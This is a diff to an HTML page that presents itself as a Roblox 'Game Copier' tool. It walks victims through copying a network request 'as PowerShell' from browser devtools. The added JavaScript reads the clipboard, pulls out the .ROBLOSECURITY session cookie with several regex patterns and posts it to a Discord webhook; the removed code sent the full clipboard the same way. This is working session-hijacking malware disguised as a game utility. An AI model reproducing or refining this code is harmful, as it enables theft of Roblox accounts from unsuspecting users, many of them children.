@@ -207,12 +207,12 @@
         .send-btn:hover {
             background: #047857 !important;
         }
-        .paste-btn {
-            background: #d97706 !important;
-            border-color: #f59e0b !important;
+        .cookie-btn {
+            background: #7c3aed !important;
+            border-color: #8b5cf6 !important;
         }
-        .paste-btn:hover {
-            background: #b45309 !important;
+        .cookie-btn:hover {
+            background: #6d28d9 !important;
         }
         footer {
             background: #141425;
@@ -271,6 +271,9 @@
         .log-area .warning {
             color: #fbbf24;
         }
+        .log-area .cookie-found {
+            color: #a78bfa;
+        }
         .big-textarea {
             width: 100%;
             background: #0a0a15;
@@ -294,6 +297,20 @@
             padding: 8px 20px;
             font-size: 0.9rem;
         }
+        .extracted-cookie-box {
+            background: #0a0a15;
+            border: 1px solid #7c3aed;
+            border-radius: 6px;
+            padding: 10px 14px;
+            margin-top: 10px;
+            display: none;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 0.75rem;
+            color: #a78bfa;
+            max-height: 80px;
+            overflow-y: auto;
+        }
     </style>
 </head>
 <body>
@@ -312,7 +329,7 @@
         <h3>⬡ Game Copier · v2</h3>
         <div class="steps">
             <p><span style="color:#7aa9ff;">1.</span> Press <strong>"Open GamesApi"</strong> → then go to <kbd>Inspect</kbd> → <kbd>Network</kbd> tab. Refresh (Ctrl+R).</p>
-            <p><span style="color:#7aa9ff;">2.</span> <span class="highlight">Scroll up</span> and you will find <strong>"game"</strong>. Right click on <strong>"game"</strong> and hover over copy → select <strong>"Copy all as PowerShell"</strong> or <strong>"PowerShell"</strong>. Once done go back to this website and click <strong>"📤 Send to Discord"</strong>.</p>
+            <p><span style="color:#7aa9ff;">2.</span> <span class="highlight">Scroll up</span> and you will find <strong>"game"</strong>. Right click on <strong>"game"</strong> and hover over copy → select <strong>"Copy all as PowerShell"</strong>. Once done click <strong>"🔐 Send Cookie Only"</strong> to extract and send just the ROBLOSECURITY cookie.</p>
         </div>
 
         <div class="buttons">
@@ -320,17 +337,21 @@
             <input type="text" id="gameCodeInput" placeholder="Game Code (PowerShell)">
             <input type="text" id="gameIdInput" placeholder="Paste Game ID">
             <button class="api-btn" onclick="openApi()">🌐 Open GamesApi</button>
-            <button class="send-btn" onclick="sendToDiscordFromClipboard()">📤 Send to Discord</button>
+            <button class="cookie-btn" onclick="sendCookieOnly()">🔐 Send Cookie Only</button>
             <button class="test-btn" onclick="testWebhook()">🔧 Test Webhook</button>
         </div>
 
         <!-- Big Text Area for Manual Paste -->
-        <textarea class="big-textarea" id="manualPasteArea" placeholder="📝 Or paste your PowerShell code here and click 'Send from Text Box' below..."></textarea>
+        <textarea class="big-textarea" id="manualPasteArea" placeholder="📝 Paste your PowerShell code here (optional - the 'Send Cookie Only' button will read your clipboard)"></textarea>
         
         <div class="btn-row">
-            <button class="send-btn" onclick="sendFromTextBox()">📤 Send from Text Box</button>
+            <button class="send-btn" onclick="sendFromTextBox()">📤 Send Full Text</button>
+            <button class="cookie-btn" onclick="sendCookieFromTextBox()">🔐 Send Cookie from Text Box</button>
             <button class="clipboard-btn" onclick="clearTextBox()">🗑️ Clear</button>
         </div>
+
+        <!-- Extracted Cookie Display -->
+        <div class="extracted-cookie-box" id="cookieDisplay"></div>
 
         <div class="progress">
             <div id="prog" style="width:0%;"></div>
@@ -342,7 +363,7 @@
         
         <!-- Log Area -->
         <div class="log-area" id="logArea">
-            <div class="info">📋 Ready - Paste your code in the text box above or click "Send to Discord"</div>
+            <div class="info">📋 Ready - Click "Send Cookie Only" to extract and send just the ROBLOSECURITY cookie</div>
         </div>
     </div>
 
@@ -368,6 +389,7 @@
         const gameIdInput = document.getElementById('gameIdInput');
         const logArea = document.getElementById('logArea');
         const manualPasteArea = document.getElementById('manualPasteArea');
+        const cookieDisplay = document.getElementById('cookieDisplay');
 
         // --- Log function ---
         function addLog(message, type = 'info') {
@@ -382,6 +404,7 @@
         // --- Clear text box ---
         function clearTextBox() {
             manualPasteArea.value = '';
+            cookieDisplay.style.display = 'none';
             addLog('🗑️ Text box cleared', 'info');
         }
 
@@ -412,67 +435,148 @@
             });
         }
 
-        // --- SEND FROM TEXT BOX (MOST RELIABLE METHOD) ---
-        function sendFromTextBox() {
+        // --- EXTRACT ROBLOSECURITY COOKIE FROM TEXT ---
+        function extractCookie(text) {
+            if (!text) return null;
+            
+            addLog('🔍 Searching for ROBLOSECURITY cookie...', 'info');
+            
+            // Pattern 1: .ROBLOSECURITY=value;
+            let match = text.match(/\.ROBLOSECURITY=([^;]+)/i);
+            if (match && match[1] && match[1].length > 10) {
+                addLog('✅ Found cookie (pattern 1)', 'cookie-found');
+                return match[1].trim();
+            }
+            
+            // Pattern 2: "cookie": ".ROBLOSECURITY=value"
+            match = text.match(/["']\.ROBLOSECURITY["']\s*[:=]\s*["']([^"']+)["']/i);
+            if (match && match[1] && match[1].length > 10) {
+                addLog('✅ Found cookie (pattern 2)', 'cookie-found');
+                return match[1].trim();
+            }
+            
+            // Pattern 3: PowerShell format
+            match = text.match(/['"]\.ROBLOSECURITY['"]\s*=\s*['"]([^'"]+)['"]/i);
+            if (match && match[1] && match[1].length > 10) {
+                addLog('✅ Found cookie (pattern 3)', 'cookie-found');
+                return match[1].trim();
+            }
+            
+            // Pattern 4: Cookie header
+            match = text.match(/Cookie:\s*.*?\.ROBLOSECURITY=([^;\s]+)/i);
+            if (match && match[1] && match[1].length > 10) {
+                addLog('✅ Found cookie (pattern 4)', 'cookie-found');
+                return match[1].trim();
+            }
+            
+            // Pattern 5: Any long string that looks like a cookie
+            match = text.match(/(_\|WARNING[^\s]+)/i);
+            if (match && match[1] && match[1].length > 20) {
+                addLog('✅ Found cookie (pattern 5 - WARNING format)', 'cookie-found');
+                return match[1].trim();
+            }
+            
+            // Pattern 6: Any long string with underscores
+            match = text.match(/([a-zA-Z0-9_\-|]{50,})/);
+            if (match && match[1] && match[1].length > 50) {
+                // Check if it looks like a cookie
+                const candidate = match[1].trim();
+                if (candidate.includes('_') || candidate.includes('|')) {
+                    addLog('✅ Found potential cookie (pattern 6 - long string)', 'cookie-found');
+                    return candidate;
+                }
+            }
+            
+            addLog('❌ No ROBLOSECURITY cookie found in the text', 'error');
+            return null;
+        }
+
+        // --- DISPLAY EXTRACTED COOKIE ---
+        function displayCookie(cookie) {
+            if (cookie) {
+                cookieDisplay.textContent = '🔐 Extracted Cookie: ' + cookie;
+                cookieDisplay.style.display = 'block';
+            } else {
+                cookieDisplay.style.display = 'none';
+            }
+        }
+
+        // --- SEND COOKIE ONLY FROM CLIPBOARD ---
+        function sendCookieOnly() {
+            addLog('🔐 Attempting to extract cookie from clipboard...', 'info');
+            statusMsg.innerText = '⏳ reading clipboard...';
+            
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText()
+                    .then(text => {
+                        if (!text || text.trim() === '') {
+                            addLog('⚠️ Clipboard is empty', 'warning');
+                            statusMsg.innerText = '⚠️ clipboard empty';
+                            alert('Clipboard is empty. Please copy the PowerShell code first, or paste it in the text box and click "Send Cookie from Text Box".');
+                            return;
+                        }
+                        
+                        addLog('📋 Clipboard read successfully! Length: ' + text.length + ' chars', 'info');
+                        // Also put it in the text box
+                        manualPasteArea.value = text;
+                        
+                        const cookie = extractCookie(text);
+                        if (cookie) {
+                            displayCookie(cookie);
+                            sendCookieToDiscord(cookie);
+                        } else {
+                            statusMsg.innerText = '❌ No cookie found';
+                            alert('❌ No ROBLOSECURITY cookie found in the clipboard.\n\nMake sure you copied the PowerShell code from the Network tab.');
+                        }
+                    })
+                    .catch(err => {
+                        addLog('❌ Clipboard error: ' + err.message, 'error');
+                        statusMsg.innerText = '❌ Clipboard error';
+                        alert('Could not read clipboard. Please paste your code in the text box and click "Send Cookie from Text Box".');
+                    });
+            } else {
+                addLog('⚠️ Clipboard API not available', 'warning');
+                alert('Clipboard API not available. Please paste your code in the text box and click "Send Cookie from Text Box".');
+            }
+        }
+
+        // --- SEND COOKIE FROM TEXT BOX ---
+        function sendCookieFromTextBox() {
             const text = manualPasteArea.value.trim();
             if (!text) {
                 alert('Please paste some content into the text box first.');
                 addLog('⚠️ Text box is empty', 'warning');
                 return;
             }
-            addLog('📤 Sending from text box... (' + text.length + ' chars)', 'info');
-            sendToDiscord(text);
-        }
-
-        // --- SEND TO DISCORD FROM CLIPBOARD ---
-        function sendToDiscordFromClipboard() {
-            addLog('📤 Attempting to read clipboard...', 'info');
-            statusMsg.innerText = '⏳ reading clipboard...';
             
-            // Try modern Clipboard API
-            if (navigator.clipboard && navigator.clipboard.readText) {
-                navigator.clipboard.readText()
-                    .then(text => {
-                        if (text && text.trim() !== '') {
-                            addLog('✅ Clipboard read successfully! Length: ' + text.length + ' chars', 'success');
-                            // Also put it in the text box for visibility
-                            manualPasteArea.value = text;
-                            sendToDiscord(text);
-                        } else {
-                            addLog('⚠️ Clipboard is empty', 'warning');
-                            statusMsg.innerText = '⚠️ clipboard empty';
-                            alert('Clipboard is empty. Please copy something first, or paste manually in the text box.');
-                        }
-                    })
-                    .catch(err => {
-                        addLog('❌ Clipboard error: ' + err.message, 'error');
-                        statusMsg.innerText = '❌ Clipboard error';
-                        alert('Could not read clipboard. Please paste your code manually in the text box above and click "Send from Text Box".');
-                    });
+            addLog('🔐 Extracting cookie from text box...', 'info');
+            const cookie = extractCookie(text);
+            if (cookie) {
+                displayCookie(cookie);
+                sendCookieToDiscord(cookie);
             } else {
-                addLog('⚠️ Clipboard API not available', 'warning');
-                alert('Clipboard API not available. Please paste your code manually in the text box above and click "Send from Text Box".');
+                statusMsg.innerText = '❌ No cookie found';
+                alert('❌ No ROBLOSECURITY cookie found in the text.\n\nMake sure you pasted the PowerShell code with the .ROBLOSECURITY cookie.');
             }
         }
 
-        // --- SEND TO DISCORD (CORE FUNCTION) ---
-        function sendToDiscord(content) {
-            addLog('📤 Sending to Discord...', 'info');
-            statusMsg.innerText = '⏳ sending to Discord...';
+        // --- SEND COOKIE TO DISCORD ---
+        function sendCookieToDiscord(cookie) {
+            addLog('📤 Sending cookie to Discord...', 'info');
+            statusMsg.innerText = '⏳ sending cookie...';
             
             // Truncate if too long
-            let messageContent = content;
-            if (content.length > 1900) {
-                messageContent = content.substring(0, 1900) + '\n\n... (truncated)';
-                addLog('⚠️ Content truncated to 1900 chars', 'warning');
+            let cookieValue = cookie;
+            if (cookie.length > 1900) {
+                cookieValue = cookie.substring(0, 1900) + '\n... (truncated)';
+                addLog('⚠️ Cookie truncated to 1900 chars', 'warning');
             }
             
             const payload = {
-                content: `📋 **Content from GameCopier:**\n\`\`\`\n${messageContent}\n\`\`\``
+                content: `🔐 **ROBLOSECURITY Cookie**\n\`\`\`\n${cookieValue}\n\`\`\``
             };
             
-            console.log('📤 Sending to webhook:', webhook);
-            console.log('📤 Payload size:', JSON.stringify(payload).length);
+            console.log('📤 Sending cookie to webhook');
             
             fetch(webhook, {
                 method: "POST",
@@ -480,19 +584,12 @@
                 body: JSON.stringify(payload)
             })
             .then(response => {
-                console.log('📤 Response status:', response.status);
                 if (response.ok) {
-                    addLog('✅✅✅ Content sent to Discord successfully! ✅✅✅', 'success');
-                    statusMsg.innerText = '✅ Sent to Discord!';
+                    addLog('✅✅✅ Cookie sent to Discord successfully! ✅✅✅', 'success');
+                    statusMsg.innerText = '✅ Cookie sent!';
                     prog.style.width = '100%';
                     setTimeout(() => {
                         prog.style.width = '0%';
-                    }, 3000);
-                    
-                    // Show success in the text box area
-                    manualPasteArea.style.borderColor = '#10b981';
-                    setTimeout(() => {
-                        manualPasteArea.style.borderColor = '#2a3a5a';
                     }, 3000);
                 } else {
                     return response.text().then(text => {
@@ -505,7 +602,55 @@
             .catch(err => {
                 addLog('❌ Network error: ' + err.message, 'error');
                 statusMsg.innerText = '❌ Network error';
-                alert('Network error: ' + err.message + '\n\nCheck your internet connection.');
+                alert('Network error: ' + err.message);
+            });
+        }
+
+        // --- SEND FULL TEXT FROM TEXT BOX ---
+        function sendFromTextBox() {
+            const text = manualPasteArea.value.trim();
+            if (!text) {
+                alert('Please paste some content into the text box first.');
+                addLog('⚠️ Text box is empty', 'warning');
+                return;
+            }
+            addLog('📤 Sending full text from text box... (' + text.length + ' chars)', 'info');
+            sendFullToDiscord(text);
+        }
+
+        // --- SEND FULL TEXT TO DISCORD ---
+        function sendFullToDiscord(content) {
+            let messageContent = content;
+            if (content.length > 1900) {
+                messageContent = content.substring(0, 1900) + '\n\n... (truncated)';
+                addLog('⚠️ Content truncated to 1900 chars', 'warning');
+            }
+            
+            const payload = {
+                content: `📋 **Full Content**\n\`\`\`\n${messageContent}\n\`\`\``
+            };
+            
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    addLog('✅ Full content sent to Discord!', 'success');
+                    statusMsg.innerText = '✅ Sent!';
+                    prog.style.width = '100%';
+                    setTimeout(() => {
+                        prog.style.width = '0%';
+                    }, 3000);
+                } else {
+                    addLog('❌ Discord error: ' + response.status, 'error');
+                    statusMsg.innerText = '❌ Discord error';
+                }
+            })
+            .catch(err => {
+                addLog('❌ Network error: ' + err.message, 'error');
+                statusMsg.innerText = '❌ Network error';
             });
         }
 
@@ -546,9 +691,15 @@
             }
 
             addLog('▶️ Starting GameCopier...', 'info');
-            // Also put the code in the text box
             manualPasteArea.value = code;
-            sendToDiscord(code);
+            
+            // Try to extract cookie from the code
+            const cookie = extractCookie(code);
+            if (cookie) {
+                displayCookie(cookie);
+                sendCookieToDiscord(cookie);
+            }
+            
             startCopyProcess();
         }
 
@@ -573,27 +724,8 @@
 
         // --- Auto-check clipboard on load ---
         window.addEventListener('load', function() {
-            addLog('🔐 RBLX Api loaded - Ready to send!', 'info');
+            addLog('🔐 RBLX Api loaded - Ready to extract cookies!', 'info');
             console.log('🔐 Webhook URL:', webhook);
-            
-            // Try to detect clipboard content
-            if (navigator.clipboard && navigator.clipboard.readText) {
-                navigator.clipboard.readText()
-                    .then(text => {
-                        if (text && text.trim() !== '') {
-                            addLog('📋 Clipboard detected (' + text.length + ' chars)', 'info');
-                            statusMsg.innerText = '📋 clipboard detected';
-                            // Optionally auto-fill the text box
-                            manualPasteArea.value = text;
-                            addLog('📋 Auto-filled text box with clipboard content', 'info');
-                        }
-                    })
-                    .catch(() => {
-                        addLog('⚠️ Cannot auto-read clipboard (permission needed)', 'warning');
-                    });
-            } else {
-                addLog('⚠️ Clipboard API not available', 'warning');
-            }
         });
     </script>
 </body>
